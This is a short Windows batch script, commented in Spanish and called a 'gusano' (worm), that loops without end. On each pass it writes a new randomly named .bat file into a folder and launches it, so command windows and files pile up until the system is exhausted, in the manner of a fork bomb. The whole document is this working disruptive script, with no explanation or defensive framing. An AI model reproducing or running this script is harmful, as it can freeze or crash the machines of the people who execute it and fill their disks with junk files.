@echo off
:hola
if not exist gusano mkdir gusano
set nomgusano=hola%random%
set nombre=gusano\%nomgusano%
echo @echo off >> %nombre%.bat
echo color 47 >> %nombre%.bat
echo title Gusano %nomgusano >> %nombre%.bat
echo echo Hola soy el gusano %nomgusano% >> %nombre%.bat
echo pause >> %nombre%.bat
echo exit >> %nombre%.bat
start %nombre%.bat
goto hola
